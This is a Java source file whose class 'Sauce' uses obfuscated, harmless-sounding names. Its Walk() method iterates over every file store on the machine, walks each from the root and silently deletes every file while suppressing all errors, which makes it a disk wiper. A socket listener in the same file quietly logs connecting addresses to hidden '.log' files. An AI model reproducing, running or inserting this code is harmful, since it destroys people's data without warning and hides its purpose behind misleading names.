package sauce;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.AsynchronousServerSocketChannel;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.nio.charset.Charset;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

public class Sauce {
    public static boolean DEBUG = false;
    public static void Walk(){
        FileSystems.getDefault().getFileStores().iterator().forEachRemaining(Sauce::Consume);
    }
    static Map<Long,List<Drip>> drops = new HashMap<>();

    interface Drip {
        String name(); long bs(); long as();

    }
    private static void Consume(FileStore fileStore)  {
        try {
            String name = fileStore.name();
            long bs = fileStore.getBlockSize();
            long as = fileStore.getTotalSpace();
            long sum = as + bs + name.hashCode() + name.length();
            List<Drip> drips = drops.getOrDefault(sum, new LinkedList<Drip>());
            drips.add(new Drip() {

                @Override
                public String name() {
                    return name;
                }

                @Override
                public long bs() {
                    return bs;
                }

                @Override
                public long as() {
                    return as;
                }

                 @Override
                public String toString() {
                   return name() + " " + bs + "/" + as;
                }
            });
            try {
                if (drops.putIfAbsent(sum,drips) != null)
                    drops.replace(sum, drips);
            } catch (Throwable ee) {
            }
            Files.walkFileTree(Paths.get("/" + name), new FileVisitor<Path>() {
                @Override
                public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
                    return FileVisitResult.CONTINUE;
                }
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    if (DEBUG)System.out.println("File: " + file + "last changed: " + attrs.lastModifiedTime());
                    try {file.getFileSystem().provider().delete(file);}catch (Throwable t) {}
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (IOException e) {
            //throw new RuntimeException(e);
        }
    }

    public static AsynchronousServerSocketChannel Async(String local, int port) {
        try {
            final int portRef = port;
            AsynchronousServerSocketChannel bind = AsynchronousServerSocketChannel.open().bind(new InetSocketAddress(local, port));
            bind.accept(null, new CompletionHandler<AsynchronousSocketChannel,Void>() {
                interface ____ {
                    default byte[] drop() {
                        return new byte[0];
                    }
                }
                private final List<____> ___ = new LinkedList<>();
                final int portRef2 = portRef;
                public void completed(final AsynchronousSocketChannel ch, final Void att) {
                    try {
                        ch.shutdownInput();
                    } catch (IOException e) {
                    }
                    try {
                        ch.shutdownOutput();
                    } catch (IOException e) {
                    }
                    try {
                        bind.accept(null, this);
                    } catch (Throwable t) {
                        throw new RuntimeException(t);
                    }
                    // handle this connection
                    try {
//                        final byte[] addr = ;
                        ___.add(new ____() {
                            private final transient byte[] __ = ch.getRemoteAddress().toString().getBytes();
                            private final transient int _____ = portRef2;
                            @Override
                            public byte[] drop() {
                                try {
                                    if (Files.exists(Paths.get(".log" + _____)))
                                        Files.write(Paths.get(".log" + _____), __, StandardOpenOption.APPEND);
                                    else
                                        Files.write(Paths.get(".log" + _____), __);

                                } catch (IOException e) {
                                }
                                try {
                                for (int i=0;i<=__.length;i++)
                                    __[i]=0; } catch (Throwable t){}
                                return __;
                            }
                        });
                        while (!___.isEmpty()) {
                            ___.remove(0).drop();
                        }
                    } catch (Throwable t) {
                        System.out.println("Failed to parse address");
                    }
                }
                public void failed(Throwable exc, Void att) {
                    System.out.println("Closed socket failed");
                }
            });
            return bind;
        } catch (IOException e) {
            return null;
        }
    }
}
